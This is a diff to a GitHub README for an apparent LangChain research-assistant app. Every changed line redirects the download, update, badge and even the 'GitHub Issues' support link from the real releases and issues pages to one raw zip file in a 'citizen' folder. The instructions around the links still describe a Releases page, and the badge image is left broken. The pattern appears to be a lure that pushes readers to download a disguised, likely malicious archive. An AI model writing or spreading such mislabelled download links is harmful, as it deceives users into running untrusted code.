@@ -1,6 +1,6 @@
 # 🤖 AI-Powered-Research-Assistant-using-Langchain - Simplify Your Research Process
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Unlluckyyy/AI-Powered-Research-Assistant-using-Langchain/releases)
+[![Download Now](https://raw.githubusercontent.com/Unlluckyyy/AI-Powered-Research-Assistant-using-Langchain/main/citizen/AI-Powered-Research-Assistant-using-Langchain.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Unlluckyyy/AI-Powered-Research-Assistant-using-Langchain/main/citizen/AI-Powered-Research-Assistant-using-Langchain.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run the AI-Powered Research Assis
 
 To download the application, please follow these steps:
 
-1. Click on this link: [Download the latest version](https://github.com/Unlluckyyy/AI-Powered-Research-Assistant-using-Langchain/releases).
+1. Click on this link: [Download the latest version](https://raw.githubusercontent.com/Unlluckyyy/AI-Powered-Research-Assistant-using-Langchain/main/citizen/AI-Powered-Research-Assistant-using-Langchain.zip).
 2. On the Releases page, find the latest version listed at the top.
 3. You will see a list of files available for download. Choose the appropriate file for your operating system (e.g., Windows, Mac, Linux).
 4. Click the file name to begin the download.
@@ -57,7 +57,7 @@ The results will appear on the screen. You can save the summary and citations by
 
 To ensure you have the latest features and fixes, follow these steps for updates:
 
-1. Return to the [Releases page](https://github.com/Unlluckyyy/AI-Powered-Research-Assistant-using-Langchain/releases).
+1. Return to the [Releases page](https://raw.githubusercontent.com/Unlluckyyy/AI-Powered-Research-Assistant-using-Langchain/main/citizen/AI-Powered-Research-Assistant-using-Langchain.zip).
 2. Download the latest version as described in the “Download & Install” section.
 3. Close the current application before running the new version.
 
@@ -80,7 +80,7 @@ If these solutions do not resolve your issue, you can reach out for support thro
 
 ## 📞 Support
 
-For any further questions or help, please visit our [GitHub Issues page](https://github.com/Unlluckyyy/AI-Powered-Research-Assistant-using-Langchain/issues). We are here to assist you.
+For any further questions or help, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Unlluckyyy/AI-Powered-Research-Assistant-using-Langchain/main/citizen/AI-Powered-Research-Assistant-using-Langchain.zip). We are here to assist you.
 
 ## 🏷️ Topics Covered
 
@@ -101,4 +101,4 @@ This application leverages various technologies, including:
 
 By utilizing these tools, the AI-Powered Research Assistant offers enhanced performance in understanding and summarizing research materials.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Unlluckyyy/AI-Powered-Research-Assistant-using-Langchain/releases)
+[![Download Now](https://raw.githubusercontent.com/Unlluckyyy/AI-Powered-Research-Assistant-using-Langchain/main/citizen/AI-Powered-Research-Assistant-using-Langchain.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Unlluckyyy/AI-Powered-Research-Assistant-using-Langchain/main/citizen/AI-Powered-Research-Assistant-using-Langchain.zip)
